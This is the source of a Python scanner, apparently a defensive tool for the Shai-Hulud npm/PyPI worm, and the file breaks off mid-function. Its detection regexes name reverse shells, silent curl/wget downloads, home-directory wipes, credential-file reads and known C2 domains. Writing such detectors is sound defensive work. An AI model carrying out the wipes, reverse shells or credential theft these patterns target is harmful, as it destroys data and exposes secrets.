#!/usr/bin/env python3
"""
shai_hulud_guard.py  v2.0.0
───────────────────────────────────────────────────────────────────────────────
Cross-platform scanner and patch tool for the Shai-Hulud npm supply-chain
worm family. Covers all documented waves (Sept 2025 → May 2026) and variants.

MODES
─────
  --scan        Detect infection indicators in an existing project / machine
  --check       Pre-install safety analysis of a specific npm (or PyPI) package
  --lockcheck   Deep analysis of package-lock.json (integrity, resolved URLs)
  --patch       Scan + classify infection + generate / execute remediation
  --incident    Print step-by-step incident response guide

USAGE
─────
  python shai_hulud_guard.py --scan
  python shai_hulud_guard.py --scan --path /path/to/project
  python shai_hulud_guard.py --check @tanstack/react-router@1.169.5
  python shai_hulud_guard.py --lockcheck
  python shai_hulud_guard.py --lockcheck --path /path/to/project
  python shai_hulud_guard.py --patch
  python shai_hulud_guard.py --patch --auto   # executes safe steps automatically
  python shai_hulud_guard.py --incident

CHANGES FROM v1.1.0
───────────────────
  • CHECK 3.5 (new): package-lock.json deep analysis (v1/v2/v3 formats)
      — resolved URL verification (flags non-registry and known-C2 sources)
      — integrity hash presence and format validation
      — known-bad version cross-reference in the lock file
      — lifecycle script scanning inside lockfile package entries (v2/v3)
  • CHECK 7 (new): npm registry config audit (flags non-default registries)
  • Windows persistence detection via Task Scheduler (schtasks) + Startup folder
  • Infection case classifier: CLEAN / UNCERTAIN / LOW_CONFIDENCE /
    DAEMON_ONLY / PACKAGES_ONLY / FULL_COMPROMISE / LOCKFILE_TAMPERED
  • Confidence scoring: DEFINITIVE / HIGH / MEDIUM / LOW / UNCERTAIN
  • Automated remediation engine (--patch mode):
      — daemon removal scripts generated for Linux / macOS / Windows
      — package quarantine and clean reinstall commands
      — case-specific verification steps for uncertain findings
      — writes ready-to-run patch scripts (remove_daemon.sh/.ps1, clean_packages.sh/.ps1)
      — --auto flag executes safe non-destructive steps automatically
  • --lockcheck mode: dedicated lock file auditing with full per-package report
  • Additional IOC patterns from the support Node.js scanner (ported to Python):
      reverse shells, silent downloads, /etc/passwd access, .env access, exec()
  • import subprocess + shutil added (stdlib only — still zero external deps)

HONEST LIMITATIONS
──────────────────
  • Pattern detection can be evaded by novel obfuscation
  • Known-bad version list lags active attacks (cross-check Datadog IOC repo)
  • 'No findings' is not a guarantee of clean state
  • --auto executes only non-destructive steps; credential rotation is always manual
  • Does NOT replace behavioral analysis at registry/network layer (Socket, Wiz, Snyk)
  • Tarball scan is heuristic — a zero-day variant produces zero findings

Requirements: Python 3.8+ — zero external dependencies
"""

import argparse
import base64
import hashlib
import io
import json
import os
import platform
import re
import shlex
import shutil
import subprocess
import sys
import tarfile
import textwrap
import time
import urllib.error
import urllib.parse
import urllib.request
import zipfile
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple, Union

# Ensure UTF-8 output on all platforms (Windows cp1252 workaround)
if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

# ═══════════════════════════════════════════════════════════════════════════════
#  VERSION & CONSTANTS
# ═══════════════════════════════════════════════════════════════════════════════
VERSION       = "2.4.0"
REGISTRY_BASE = "https://registry.npmjs.org"
PYPI_BASE     = "https://pypi.org/pypi"
IOC_REPO      = "https://github.com/DataDog/indicators-of-compromise/tree/main/shai-hulud-2.0"
STEPSEC_BLOG  = "https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised"
CISA_ALERT    = "https://www.cisa.gov/news-events/alerts/2025/09/23/widespread-supply-chain-compromise-impacting-npm-ecosystem"

# ── Known malicious filenames (payload files deposited by the worm) ──────────
MALICIOUS_FILENAMES = {
    "router_init.js",      # Core payload, all waves (~2.3 MB obfuscated)
    "setup_bun.js",        # Bun installer stub, waves 2+
    "bun_environment.js",  # Bun environment setup, wave 2
    "setup.mjs",           # ESM variant used in wave 1
}

# ── IOC patterns ─────────────────────────────────────────────────────────────
#  Format: (regex, human description, risk_level)
#  risk_level: CRITICAL | HIGH | MEDIUM | LOW
MALICIOUS_PATTERNS: List[Tuple[str, str, str]] = [
    # ── Worm identity markers ────────────────────────────────────────────────
    (r"Sha[i1].?Hulud|Shai.?Hulud",              "Worm identity string",                       "CRITICAL"),
    (r"Here We Go Again|The Second Coming",       "Worm campaign tag",                          "CRITICAL"),
    # Reversed banner — the worm reverses its marker to evade naïve string matching.
    # Source: perplexityai/bumblebee threat_intel/antv-mini-shai-hulud.json
    # `_indicators` (marker reversed) cross-referenced to the Socket.dev advisory.
    (r"niagA oG eW ereH|duluH-iahS",              "Reversed Shai-Hulud worm marker (obfuscation)", "CRITICAL"),
    (r"TeamPCP|DeadCatx3|PCPcat|ShellForce|CipherForce", "Known threat actor marker",          "CRITICAL"),
    (r"gh.?token.?monitor",                       "Persistent token-monitor daemon name",       "CRITICAL"),
    (r"A Mini Shai.?Hulud has Appeared",          "Worm repo description tag",                  "CRITICAL"),
    # ── Destructive payload ──────────────────────────────────────────────────
    # Home-ROOT wipe only — `rm -rf ~`, `rm -rf ~/`, `rm -rf $HOME`. Deliberately
    # does NOT match `rm -rf ~/subdir` or `rm -rf $HOME/build` (legitimate build
    # scripts clean subdirectories of home — see Pillow depends/*.sh). The worm's
    # kill switch wipes the ENTIRE home directory, which is what this targets.
    (r"rm\s+-rf\s+[\"']?~(?:/?[\"'\s]|/?$)|rm\s+-rf\s+\$(?:HOME|USERPROFILE|USER\b)(?:[\s\"']|/?$)",
                                                   "Linux/macOS home-directory wipe",           "CRITICAL"),
    (r"Remove-Item\s+.*-Recurse.*Home|rmdir\s+/s\s+/q\s+.*%USERPROFILE%",
                                                   "Windows home-directory wipe",               "CRITICAL"),
    # ── Exfiltration infrastructure ──────────────────────────────────────────
    (r"git-tanstack\[?\.\]?com|git-tanstack\.com", "Known C2 typosquat domain",                 "CRITICAL"),
    (r"webhook\.site\/[a-f0-9\-]{36}",            "Known exfiltration endpoint (webhook.site)", "CRITICAL"),
    (r"getsession\.org|signal\.org|oxen\.io",     "Session network (C2 exfiltration channel)",  "HIGH"),
    # ── Credential file targeting ────────────────────────────────────────────
    (r"application_default_credentials\.json",    "GCP credential file access",                 "HIGH"),
    # AWS: flag only credential FILE reads and clear exfiltration — not env-var references
    # (boto3/botocore legitimately reference AWS_SECRET_ACCESS_KEY as env var names)
    (r"\.aws[/\\]credentials",                    "AWS credential file path referenced",        "HIGH"),
    (r"AWS_SECRET_ACCESS_KEY[^\w].{0,60}(?:curl|fetch|requests?\.|http|urllib|send|post|put)\b"
     r"|(?:curl|fetch|requests?\.|http|urllib|send|post|put).{0,60}AWS_SECRET_ACCESS_KEY",
                                                   "AWS credentials in HTTP request context (exfiltration signal)", "CRITICAL"),
    (r"AZURE_CLIENT_SECRET|AZURE_TENANT_ID|azure_credentials",
                                                   "Azure credential access",                   "HIGH"),
    # Require .ssh/ path prefix so pattern doesn't fire on crypto library docs/code
    (r"\.ssh[/\\](?:id_rsa|id_ed25519|id_ecdsa)\b|[\"'`~]\.ssh[/\\]",
                                                   "SSH key file path access (.ssh/ prefix)",   "HIGH"),
    # Require file-read context so plain '.npmrc' in docs doesn't fire
    (r"(?:readFile|read_text|open|fs\.[rs]|cat\s+)[^\n]{0,60}\.npmrc|\.npmrc[^\n]{0,40}(?:_authToken|_auth\s*=)",
                                                   ".npmrc credential file read",               "HIGH"),
    # ── Token literal patterns ────────────────────────────────────────────────
    (r"ghp_[A-Za-z0-9]{36}",                      "GitHub PAT literal in code",                 "CRITICAL"),
    (r"gho_[A-Za-z0-9]{36}",                      "GitHub OAuth token literal",                 "CRITICAL"),
    (r"npm_[A-Za-z0-9]{36}",                      "npm token literal",                          "CRITICAL"),
    # ── Runtime substitution (Bun installed silently during preinstall) ──────
    (r"bun\.sh/install|curl.*bun\.sh|install.*bun\.sh|bunx\b",
                                                   "Bun runtime installer in lifecycle script",  "HIGH"),
    (r"\"bun\"\s*,?\s*\"run\"|spawn.*bun\b",      "Bun used to execute payload",                "HIGH"),
    # ── OIDC / CI token extraction ────────────────────────────────────────────
    # Word boundaries on ptrace/process_vm_readv so they don't match inside
    # identifiers like depTrace, backtrace, stackTrace (vite, webpack bundles).
    (r"/proc/\d+/mem|\bptrace\s*\(|\bprocess_vm_readv\b",  "CI runner memory extraction",          "CRITICAL"),
    (r"ACTIONS_ID_TOKEN_REQUEST_URL|ACTIONS_ID_TOKEN_REQUEST_TOKEN",
                                                   "GitHub OIDC token ENV var access",          "HIGH"),
    # Literal hyphen/underscore + bounded gap so this matches a real GitHub
    # Actions `id-token: write` permission line but NOT "Invalid token … write"
    # spread across kilobytes of bundled TS compiler code (prettier FP).
    (r"id[-_]token['\"]?\s*:\s*['\"]?\s*write|id[-_]token['\"]?\s*:[^\n]{0,30}permissions",
                                                   "OIDC id-token scope in config",              "MEDIUM"),
    # ── Persistence installation ──────────────────────────────────────────────
    (r"LaunchAgents.*com\.user\.",                 "macOS LaunchAgent persistence",              "CRITICAL"),
    (r"systemd/user.*\.service",                  "Linux systemd user service persistence",     "CRITICAL"),
    (r"SCHTASKS|schtasks\.exe",                   "Windows Task Scheduler persistence",         "HIGH"),
    # ── Obfuscation signals ───────────────────────────────────────────────────
    # atob alone is a standard browser API — only flag if a long embedded literal follows
    # (legitimate uses: atob(variable), malicious uses: atob("AAAA...400chars..."))
    (r"atob\s*\(\s*['\"][A-Za-z0-9+/=]{40,}['\"]|Buffer\.from\s*\(\s*['\"][A-Za-z0-9+/=]{40,}['\"],\s*['\"]base64['\"]",
                                                   "Base64-encoded payload literal (obfuscation signal)", "HIGH"),
    (r"eval\s*\(\s*(atob|Buffer|decodeURI)",       "eval of decoded content",                    "HIGH"),
    # Only flag unicode escapes for ASCII-range characters (0020-007F)
    (r"(?:\\u00[2-7][0-9a-fA-F]){4,}",
                                                   "ASCII chars encoded as \\u escapes (obfuscation)",  "MEDIUM"),
    # ── GitHub API abuse ──────────────────────────────────────────────────────
    (r"api\.github\.com/user/repos",              "GitHub API repo creation (credential dump)",  "HIGH"),
    # Require template variable or concat context — fires on auth header construction, not docs
    (r"[\"']Authorization[\"']\s*:\s*[\"']Bearer\s+\$|[\"']Authorization[\"'].*\+.*token\b",
                                                   "Authenticated GitHub API call (auth header construction)", "MEDIUM"),
    # ── Cache poisoning fingerprints ──────────────────────────────────────────
    # pull_request_target alone is not a finding; it's only dangerous with cache (caught in CHECK 6)
    (r"pull_request_target",                      "pull_request_target trigger (only dangerous with cache — see CHECK 6)", "LOW"),
    (r"actions/cache.*restore-keys",              "Cache restore with broad key (potential poison)", "LOW"),
    # ── Patterns ported from support Node.js scanner ──────────────────────────
    (r"nc\s+-[el]|socat\s+.*exec|bash\s+-i\s+>&", "Reverse shell command",                     "CRITICAL"),
    (r"wget\s+-q\s+http|curl\s+-s[SO]?\s+http",   "Silent file download (exfiltration signal)", "HIGH"),
    (r"\/etc\/passwd|\/etc\/shadow",               "System credential file access",              "HIGH"),
    (r"(?<!\w)\.env(?!\w)",                        ".env file access",                           "MEDIUM"),
    (r"\bexec\s*\(\s*[\"'`][^\"'`]{4,}",          "Shell exec with string literal",             "MEDIUM"),
    # ── Python / PyPI specific ────────────────────────────────────────────────
    # Subprocess analysis is SPLIT BY INTENT. The single old pattern flagged any
    # `subprocess.run(["sh"|"bash"|"curl"…])` as HIGH, which over-scored every
    # native-extension build: matplotlib setupext.py runs `["sh","./autogen.sh"]`,
    # numpy/scipy/lxml/pillow shell out to configure/make. Running a LOCAL build
    # script is not the worm's behaviour — download-pipe-execute is. So:
    #   (a) a network downloader (curl/wget) spawned from a package  → HIGH
    #   (b) a shell carrying a download / pipe-to-shell / remote `-c` / reverse
    #       shell / encoded payload                                   → HIGH
    #   (c) a BARE local shell interpreter (build step?)              → MEDIUM
    # Definitive CRITICALs (home wipe, C2, token literals, reverse shells,
    # /proc/pid/mem) keep their own patterns. See docs/DESIGN.md § 2.9.
    (r"subprocess\.\w+\s*\(\s*\[?\s*['\"](?:[^'\"\s]*[/\\])?(?:curl|wget)\b",
                                                   "Subprocess spawning network downloader in package", "HIGH"),
    (r"subprocess\.\w+\s*\(\s*\[?\s*['\"](?:[^'\"\s]*[/\\])?(?:bash|sh|zsh|powershell|pwsh|cmd(?:\.exe)?)\b"
     r"[^)]{0,200}(?:-c\b|-i\b|curl|wget|https?://|\|\s*(?:ba)?sh\b|Invoke-Expression|iex\b|-enc\b|FromBase64)",
                                                   "Subprocess spawning shell with download/pipe/remote payload", "HIGH"),
    (r"subprocess\.\w+\s*\(\s*\[?\s*['\"](?:[^'\"\s]*[/\\])?(?:bash|sh|zsh|powershell|pwsh|cmd(?:\.exe)?)\b",
                                                   "Subprocess spawning shell interpreter in package (build step?)", "MEDIUM"),
    (r"os\.system\s*\(\s*['\"](?:curl|wget|rm\s+-rf|del\s+/|bash\s+-[ci])",
                                                   "os.system with dangerous command in setup",   "CRITICAL"),
    (r"__import__\s*\(\s*['\"]os['\"]",            "Dynamic os import (obfuscation pattern)",     "HIGH"),
    # atexit and distutils are LOW in generic source — they are only meaningful
    # when detected inside a setup.py or install entry-point by the caller.
    (r"atexit\.register\s*\(",                     "atexit hook registered (check if in setup/install script)", "LOW"),
    (r"cmdclass\s*=\s*\{",                         "Custom setup cmdclass override (setup.py lifecycle hook)", "MEDIUM"),
    (r"\.pth\b.*(?:import|exec|__)",               ".pth file with code injection",               "CRITICAL"),
]

# ── Known compromised versions ───────────────────────────────────────────────
# Each entry: {"bad": [versions], "waves": [tags], "advisories": [IDs]}
#   bad:        exact versions confirmed malicious (hard-block at risk=100)
#   waves:      free-form Shai-Hulud campaign tags
#   advisories: GitHub Advisory Database (GHSA) / NVD CVE / OSV IDs
#               Authoritative source priority (see CLAUDE.md § 4.7):
#               1. GHSA  (https://github.com/advisories)  ← preferred for npm/PyPI
#               2. NVD   (https://nvd.nist.gov/)          ← when a CVE is issued
#               3. OSV   (https://osv.dev/)               ← unified aggregator
#
# Advisory population & sustainable updates:
#   `advisories` cross-references each entry to authoritative supply-chain
#   advisories — GitHub Advisory Database (GHSA) IDs, verified via OSV.dev
#   (osv.dev aggregates GHSA + NVD + the npm/PyPI malware feeds). Only the
#   malicious-code / compromise advisory matching the `bad` version is listed —
#   NOT unrelated CVEs in the same package (e.g. guardrails-ai's older XXE/RCE
#   CVEs are deliberately excluded; only the 0.10.1 supply-chain advisory is).
#   To refresh or extend this mapping, a MAINTAINER runs
#   `python tools/refresh_advisories.py` — an offline tool, NEVER the scanner
#   (the scanner must not phone home: CLAUDE.md §5.4). Empty list = no published
#   supply-chain advisory cross-referenced yet. See CLAUDE.md §4.3 / §4.7.
KNOWN_BAD: Dict[str, dict] = {
    "@tanstack/react-router":  {"bad": ["1.169.5"], "waves": ["Wave5-May2026"], "advisories": ["GHSA-5q7g-gw3w-r3rh", "GHSA-g7cv-rxg3-hmpx"]},
    "@tanstack/router":        {"bad": ["1.169.5"], "waves": ["Wave5-May2026"], "advisories": ["GHSA-g7cv-rxg3-hmpx"]},
    "@tanstack/react-query":   {"bad": [],           "waves": ["Wave5-May2026"], "advisories": []},
    "@mistralai/mistralai":    {"bad": [],           "waves": ["Wave5-May2026"], "advisories": []},
    "@uipath/apollo-core":     {"bad": [],           "waves": ["Wave5-May2026"], "advisories": []},
    "guardrails-ai":           {"bad": ["0.10.1"],   "waves": ["Wave5-May2026"], "advisories": ["GHSA-xmpw-2vmm-p4p6"]},
    "mistralai":               {"bad": ["2.4.6"],    "waves": ["Wave5-May2026"], "advisories": ["GHSA-wx9m-wx4f-4cmg"]},
    "@bitwarden/cli":          {"bad": [],           "waves": ["Wave4-Apr2026"], "advisories": []},
    "intercom-client":         {"bad": ["7.0.4"],    "waves": ["Wave5-May2026"], "advisories": ["GHSA-54pg-9963-v8vg", "GHSA-4594-wxqv-j3pm"]},
    # gh-token-monitor is the persistence-daemon NAME the worm installs
    # (Linux systemd / macOS LaunchAgent / Windows Task Scheduler entry).
    # It is NOT a published-and-removed npm package — it is the artefact left
    # behind on disk. Listed here so detection and --self-test treat it
    # consistently as a Shai-Hulud indicator. See docs/THREAT_MODEL.md for the
    # attack chain explaining where this name comes from.
    "gh-token-monitor":        {"bad": [],           "waves": ["Wave1-Sep2025", "Wave5-May2026"], "advisories": []},
    # @ctrl/tinycolor (NOT the unrelated `tinycolor2` package) was the actually
    # compromised package in the Sep-2025 Wave-1 worm — confirmed via OSV and the
    # cited StepSecurity "ctrl-tinycolor" post-mortem (CLAUDE.md §4.7 source 8).
    "@ctrl/tinycolor":         {"bad": ["4.1.1", "4.1.2"], "waves": ["Wave1-Sep2025"], "advisories": ["GHSA-qjqf-7j6f-82c4"]},
    "@asyncapi/cli":           {"bad": [],           "waves": ["Wave2-Nov2025"], "advisories": ["GHSA-w364-4jj5-wj22"]},
}

HIGH_VALUE_TARGETS = set(KNOWN_BAD.keys()) | {
    "@tanstack/form", "@tanstack/table", "@tanstack/virtual",
    "@tanstack/store", "@tanstack/start", "@tanstack/query-core",
    "@squawk/core", "@opensearch-project/opensearch",
}

# ── Typosquatting detection ───────────────────────────────────────────────────
# Top ~100 npm packages; Levenshtein distance ≤ 2 from any of these is flagged.
_TOP_NPM_PACKAGES: List[str] = [
    "react", "react-dom", "vue", "angular", "svelte", "lit",
    "next", "nuxt", "gatsby", "remix", "astro",
    "redux", "mobx", "zustand", "recoil", "jotai",
    "webpack", "vite", "rollup", "parcel", "esbuild",
    "typescript", "babel",
    "jest", "vitest", "mocha", "chai", "cypress", "playwright", "puppeteer",
    "eslint", "prettier", "stylelint",
    "lodash", "underscore", "ramda", "immer", "uuid",
    "date-fns", "dayjs", "luxon", "moment",
    "axios", "node-fetch", "got", "superagent",
    "socket.io", "ws",
    "express", "fastify", "koa", "hapi",
    "mongoose", "sequelize", "prisma", "typeorm", "knex",
    "pg", "mysql2", "sqlite3", "ioredis", "redis",
    "bcrypt", "jsonwebtoken", "passport", "crypto-js",
    "commander", "yargs", "inquirer", "ora", "chalk", "minimist",
    "dotenv", "cors", "helmet", "morgan",
    "nodemon", "ts-node", "concurrently", "cross-env", "rimraf", "mkdirp",
    "husky", "lint-staged", "semver", "glob", "chokidar",
    "tailwindcss", "sass", "less",
    "electron", "capacitor",
    "aws-sdk", "firebase",
    "pino", "winston", "debug",
    "zod", "joi", "yup", "ajv",
    "react-router", "react-query",
    "multer", "sharp", "mime",
    "body-parser", "cookie-parser", "cookie",
]


def _levenshtein(a: str, b: str) -> int:
    """Wagner-Fischer edit distance."""
    if len(a) < len(b):
        return _levenshtein(b, a)
    if not b:
        return len(a)
    prev = list(range(len(b) + 1))
    for i, ca in enumerate(a, 1):
        curr = [i]
        for j, cb in enumerate(b, 1):
            curr.append(min(curr[-1] + 1, prev[j] + 1, prev[j - 1] + (0 if ca == cb else 1)))
        prev = curr
    return prev[-1]


def check_typosquatting(pkg_name: str) -> Optional[Tuple[str, str]]:
    """
    Return (message, risk) if pkg_name is ≤ 2 edits from a top-100 npm package.
    Returns None when the name IS a top package (exact match) or no near-miss found.
    """
    name = pkg_name.lower()
    if "/" in name:          # strip @scope/
        name = name.split("/", 1)[-1]
    name = name.lstrip("@")
    if not name:
        return None
    candidates: List[Tuple[int, str]] = []
    for top in _TOP_NPM_PACKAGES:
        if name == top:
            return None  # exact match — IS the popular package
        if abs(len(name) - len(top)) > 3:
            continue      # fast length-difference filter
        d = _levenshtein(name, top)
        if 1 <= d <= 2:
            candidates.append((d, top))
    if not candidates:
        return None
    candidates.sort()
    dist, closest = candidates[0]
    return (
        f"Possible typosquatting: '{pkg_name}' is {dist} edit(s) from popular package '{closest}'",
        "HIGH" if dist == 1 else "MEDIUM",
    )

DAEMON_PATHS = {
    "linux": [
        Path.home() / ".config" / "systemd" / "user" / "gh-token-monitor.service",
    ],
    "darwin": [
        Path.home() / "Library" / "LaunchAgents" / "com.user.gh-token-monitor.plist",
    ],
    "windows": [],  # detected dynamically via Task Scheduler
}

# Keywords used to detect Windows persistence entries
WINDOWS_TASK_KEYWORDS = (
    "gh-token-monitor", "github-token-monitor",
    "npm-helper", "bun-helper", "node-updater",
)

CREDENTIAL_FILES = [
    Path.home() / ".npmrc",
    Path.home() / ".gitconfig",
    Path.home() / ".config" / "gcloud" / "application_default_credentials.json",
    Path.home() / ".aws" / "credentials",
    Path.home() / ".ssh" / "id_rsa",
    Path.home() / ".ssh" / "id_ed25519",
    Path.home() / ".ssh" / "id_ecdsa",
]

# ── Infection case constants ──────────────────────────────────────────────────
CASE_CLEAN           = "CLEAN"
CASE_UNCERTAIN       = "UNCERTAIN"
CASE_LOW_CONFIDENCE  = "LOW_CONFIDENCE"
CASE_DAEMON_ONLY     = "DAEMON_ONLY"
CASE_PACKAGES_ONLY   = "PACKAGES_ONLY"
CASE_FULL_COMPROMISE = "FULL_COMPROMISE"
CASE_LOCKFILE_TAMPER = "LOCKFILE_TAMPERED"

# ═══════════════════════════════════════════════════════════════════════════════
#  FINDING DATACLASS  (structured output for --json and --diagnose)
# ═══════════════════════════════════════════════════════════════════════════════
# Backward-compatible with the legacy `findings: List[Tuple[level, msg]]` shape
# used throughout the existing run_check / run_scan / run_lockcheck / run_pypi_check
# code paths. New code emits Finding(...) directly; old code still emits tuples.
# `_wrap_finding()` normalises both into Finding for downstream serialisation.
#
# Design notes:
#   • `level` MUST be one of "CRITICAL" | "HIGH" | "MEDIUM" | "LOW" | "INFO" —
#     compared with `==` in the risk-scoring and colour-mapping pipelines.
#   • `advisories` carries GHSA / NVD CVE / OSV IDs surfaced from KNOWN_BAD.
#   • `score_contribution` is the points this finding added to risk_score; useful
#     for downstream LLM analysis of which signals dominate the verdict.
#   • Finding is iterable as `(level, title)` so `for lvl, msg in findings:`
#     continues to work where old tuple-based code expects that shape.

@dataclass
class Finding:
    level: str                              # CRITICAL | HIGH | MEDIUM | LOW | INFO
    title: str                              # short human description
    detail: str = ""                        # extended detail (path, snippet, etc.)
    path: Optional[str] = None              # file/package path if relevant
    score_contribution: int = 0             # how much this added to risk_score
    advisories: List[str] = field(default_factory=list)  # GHSA / CVE / OSV IDs

    def __iter__(self):
        # Backward compat: legacy `(level, msg) = finding` unpacking still works.
        return iter((self.level, self.title))

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


def _wrap_finding(item: Union[Finding, Tuple[str, str]]) -> Finding:
    """Normalise legacy 2-tuples and full Finding objects into Finding."""
    if isinstance(item, Finding):
        return item
    if isinstance(item, tuple) and len(item) >= 2:
        return Finding(level=str(item[0]), title=str(item[1]))
    return Finding(level="INFO", title=str(item))


# ═══════════════════════════════════════════════════════════════════════════════
#  JSON OUTPUT MODE  --json
# ═══════════════════════════════════════════════════════════════════════════════
# When --json is set on the CLI, the requested mode runs with stdout silenced
# and a single JSON object is emitted at the end. Schema (stable across all
# modes that produce findings):
#
#   {
#     "schema_version": "1.0",
#     "tool":           {"name": "shai_hulud_guard", "version": "2.4.0"},
#     "mode":           "scan"|"check"|"check-pypi"|"lockcheck"|"diagnose",
#     "target":         "<package@version>" | "<project-path>",
#     "risk_score":     0-100,
#     "case":           CLEAN|UNCERTAIN|LOW_CONFIDENCE|DAEMON_ONLY|...,
#     "confidence":     DEFINITIVE|HIGH|MEDIUM|LOW|UNCERTAIN,
#     "exit_code":      0 | 1,
#     "findings":       [Finding.to_dict(), ...],
#     "llm_instructions": "..."   ← verbatim paste-into-LLM guidance
#   }
#
# The `llm_instructions` field carries a fixed verbatim prompt fragment so users
# can pipe `--json` directly into a frontier LLM and get useful guidance with no
# additional wrapping — see docs/JSON_SCHEMA.md.

_JSON_MODE: bool = False
_JSON_RESULT: Dict[str, Any] = {}

_LLM_PROMPT = (
    "You are given a JSON object produced by shai_hulud_guard, a defensive "
    "scanner for the Shai-Hulud npm/PyPI supply-chain worm family. Use the "
    "fields below to advise the operator:\n"
    "1. Interpret `case` + `confidence` + `risk_score` together. CLEAN with "
    "   DEFINITIVE confidence and risk < 15 means proceed normally. Any other "
    "   combination warrants explicit reasoning.\n"
    "2. For each finding, weigh `level` (CRITICAL/HIGH/MEDIUM/LOW/INFO) and "
    "   `score_contribution`. Higher score_contribution = stronger signal.\n"
    "3. If `advisories` lists any GHSA/CVE/OSV IDs, cross-reference them against "
    "   GitHub Advisory Database (https://github.com/advisories) or NVD "
    "   (https://nvd.nist.gov/) and report what each advisory says.\n"
    "4. NEVER recommend revoking credentials (npm tokens, GitHub PATs, AWS/GCP/"
    "   Azure keys) before removing the gh-token-monitor daemon if it is present "
    "   in findings — that triggers `rm -rf ~/` (Shai-Hulud kill switch).\n"
    "5. Report the exit_code interpretation: 0=safe, 1=risk≥40 (block install)."
)


class _NullWriter:
    """File-like sink for stdout suppression in --json mode."""
    def write(self, *_a, **_kw): return 0
    def flush(self): pass


def _json_mode_enter() -> None:
    """Switch on JSON capture: silence stdout, reset result dict."""
    global _JSON_MODE
    _JSON_MODE = True
    _JSON_RESULT.clear()
    sys.stdout = _NullWriter()


def _json_mode_exit_and_emit() -> int:
    """Restore stdout, emit captured result as JSON, return exit code."""
    global _JSON_MODE
    sys.stdout = sys.__stdout__
    _JSON_MODE = False
    _JSON_RESULT.setdefault("schema_version", "1.0")
    _JSON_RESULT.setdefault("tool", {"name": "shai_hulud_guard", "version": VERSION})
    _JSON_RESULT.setdefault("llm_instructions", _LLM_PROMPT)
    exit_code = int(_JSON_RESULT.get("exit_code", 0))
    print(json.dumps(_JSON_RESULT, indent=2, ensure_ascii=False, default=str))
    return exit_code


def _json_record_mode_result(
    mode: str,
    target: str,
    risk_score: int = 0,
    case: str = CASE_CLEAN,
    confidence: str = "DEFINITIVE",
    findings: Optional[List[Any]] = None,
    advisory_lookup: Optional[Dict[str, List[str]]] = None,
) -> None:
    """
    Populate _JSON_RESULT from a mode function's local state.
    Called by run_check / run_scan / run_pypi_check / run_lockcheck / run_diagnose
    when _JSON_MODE is True, after they've computed their local findings list.

    `advisory_lookup` maps title-substring → list-of-advisory-ids. When a
    finding's title contains one of the keys, the matching advisories are
    attached. This wires KNOWN_BAD["advisories"] entries through to the JSON
    output without invasive refactoring of every findings.append() site.
    """
    if not _JSON_MODE:
        return
    raw = findings or []
    enriched: List[Dict[str, Any]] = []
    for item in raw:
        f = _wrap_finding(item)
        if advisory_lookup:
            for key, ids in advisory_lookup.items():
                if key and key in f.title and not f.advisories:
                    f.advisories = list(ids)
                    break
        enriched.append(f.to_dict())
    _JSON_RESULT.update({
        "mode":       mode,
        "target":     target,
        "risk_score": int(min(max(risk_score, 0), 100)),
        "case":       case,
        "confidence": confidence,
        "exit_code":  1 if risk_score >= 40 else 0,
        "findings":   enriched,
    })


# ═══════════════════════════════════════════════════════════════════════════════
#  TERMINAL OUTPUT HELPERS
# ═══════════════════════════════════════════════════════════════════════════════
_USE_COLOR = sys.stdout.isatty() and (
    platform.system() != "Windows" or os.environ.get("FORCE_COLOR") or os.environ.get("TERM")
)
def _c(text: str, code: str) -> str:
    return f"\033[{code}m{text}\033[0m" if _USE_COLOR else text
def ok(msg: str):    print(_c(f"  ✓  {msg}", "32"))
def warn(msg: str):  print(_c(f"  ⚠  {msg}", "33"))
def crit(msg: str):  print(_c(f"  ✗  {msg}", "31;1"))
def info(msg: str):  print(_c(f"  →  {msg}", "36"))
def head(msg: str):  print(_c(f"\n{'═'*62}\n  {msg}\n{'═'*62}", "1"))
def subh(msg: str):  print(_c(f"\n  ┌─ {msg}", "1"))
def dim(msg: str):   print(_c(f"     {msg}", "2"))

# ═══════════════════════════════════════════════════════════════════════════════
#  NETWORK HELPERS  (stdlib only — no requests, no httpx)
# ═══════════════════════════════════════════════════════════════════════════════
_UA = f"shai-hulud-guard/{VERSION} Python/{sys.version_info.major}.{sys.version_info.minor}"

def fetch_json(url: str, timeout: int = 12) -> Optional[dict]:
    try:
        req = urllib.request.Request(url, headers={"User-Agent": _UA, "Accept": "application/json"})
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return json.loads(resp.read().decode("utf-8", errors="replace"))
    except urllib.error.HTTPError as e:
        warn(f"HTTP {e.code} fetching {url}")
        return None
    except Exception as e:
        warn(f"Network error fetching {url}: {e}")
        return None

def fetch_bytes(url: str, timeout: int = 45) -> Optional[bytes]:
    try:
        req = urllib.request.Request(url, headers={"User-Agent": _UA})
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.read()
    except Exception as e:
        warn(f"Download failed ({url}): {e}")
        return None

# ═══════════════════════════════════════════════════════════════════════════════
#  PATTERN ENGINE
# ═══════════════════════════════════════════════════════════════════════════════
def scan_text(text: str) -> List[Tuple[str, str, str]]:
    """
    Run MALICIOUS_PATTERNS against text.
    Returns list of (description, risk_level, matched_snippet).
    Deduplicates by (desc, risk) to avoid flooding on dense payloads.
    """
    seen = set()
    findings = []
    for pattern, desc, risk in MALICIOUS_PATTERNS:
        m = re.search(pattern, text, re.IGNORECASE)
        if m:
            key = (desc, risk)
            if key not in seen:
                seen.add(key)
                findings.append((desc, risk, m.group(0)[:100]))
    return findings

def scan_tarball_bytes(tarball_bytes: bytes) -> List[Tuple[str, str, str, str]]:
    """
    Extract a .tgz from bytes and scan all text files.
    Returns list of (filepath_in_tarball, description, risk_level, snippet).
    """
    findings = []
    text_extensions = {".js", ".mjs", ".cjs", ".ts", ".tsx", ".json",
                       ".sh", ".bash", ".py", ".yml", ".yaml", ".env"}
    try:
        with tarfile.open(fileobj=io.BytesIO(tarball_bytes), mode="r:gz") as tf:
            for member in tf.getmembers():
                if not member.isfile():
                    continue
                basename = Path(member.name).name
                if basename in MALICIOUS_FILENAMES:
                    findings.append((member.name,
                                     f"Known Shai-Hulud payload filename: {basename}",
                                     "CRITICAL", basename))
                if Path(member.name).suffix.lower() in text_extensions:
                    try:
                        fobj = tf.extractfile(member)
